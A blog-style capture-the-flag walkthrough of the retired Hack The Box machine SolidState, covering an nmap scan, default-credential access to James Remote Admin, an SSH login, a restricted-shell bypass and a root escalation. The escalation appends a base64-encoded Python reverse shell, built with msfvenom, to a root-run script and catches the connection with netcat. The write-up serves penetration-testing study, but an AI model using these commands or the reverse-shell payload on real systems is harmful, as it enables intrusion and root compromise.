---
layout: post
title: "HTB-SolidState"
categories: HTB-Walkthrough
---


![solidstate](/assets/img/solidstate/solidstate.png)

SolidState is another OSCP-like box from the HTB 'retired' archive.

<h4>Nmap</h4>

`nmap -sV -Pn 10.10.10.51 |tee -a solid.txt`

```

Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-28 17:07 EST
Warning: 10.10.10.51 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.51
Host is up (0.097s latency).
Not shown: 65469 closed ports, 60 filtered ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
25/tcp   open  smtp        JAMES smtpd 2.3.2
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.20 seconds

```

After googling 'exploit james 2.3.2' I hit upon a method...and possible [exploit](https://www.exploit-db.com/exploits/35513)


<h4>Telnet James Remote Admin</h4>

First use telnet to access James Remote Admin, with default credentials root/root.


![james-admin](/assets/img/solidstate/solidstate-james-admin1.png)

Now to check each mailbox for loot.

![mailbox-loot](/assets/img/solidstate/solid-mailbox-loot.png)

![mailbox-loot2](/assets/img/solidstate/solid-mailbox-loot2.png)

![mailbox-loot3](/assets/img/solidstate/solid-mailbox-loot3.png)

<hr width="250" size="6">


This information, allows us to gain access to Mindy's user account.

`ssh mindy@10.10.10.51`


```

root@kali:~/HTB/retired/solidstate# ssh mindy@10.10.10.51
The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.51' (ECDSA) to the list of known hosts.
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt
91xxxxxxxxxxxxxxxxxxxxxxxxxxxx75
mindy@solidstate:~$ 

```

mindy has a very restricted shell.....so I try build up the available commands...

```

BASH_CMDS[ls]=/bin/ls
BASH_CMDS[uname]=/bin/uname
BASH_CMDS[nano]=/bin/nano
BASH_CMDS[cat]=/bin/cat

```

The shell is restricted but we can get around this with the james.py exploit
which will give us better shell.


```

#!/usr/bin/python
#
# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
# Date: 16\10\2014
# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu, Debian
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

```
We run the exploit, and get a better shell as mindy.



<h3>Privilege Escalation</h3>

found /opt/tmp.py

we cannot replace, but we can append to it...

```

msfvenom -p cmd/unix/reverse_python lhost=10.10.14.19 lport=443 -a cmd -e generic/none --platform unix

```

```

echo "exec('aW1wb3J0IHNvY2tldCAgICwgIHN1YnByb2Nlc3MgICAsICBvcyAgOyAgICAgICAgIGhvc3Q9IjEwLjEwLjE0LjE5IiAgOyAgICAgICAgIHBvcnQ9NDQzICA7ICAgICAgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgLCAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgOyAgICAgICAgIHMuY29ubmVjdCgoaG9zdCAgICwgIHBvcnQpKSAgOyAgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgIDApICA7ICAgICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAgMSkgIDsgICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsICAyKSAgOyAgICAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))" >> /opt/tmp.py

```


set listener ....
`nc -nlvp 443`

....and wait....


```

root@kali:~/HTB/retired/solidstate# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.51] 48652
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
cat /root/root.txt
b4xxxxxxxxxxxxxxxxxxxxxxxxxxxxc9
hostname
solidstate


```

:)
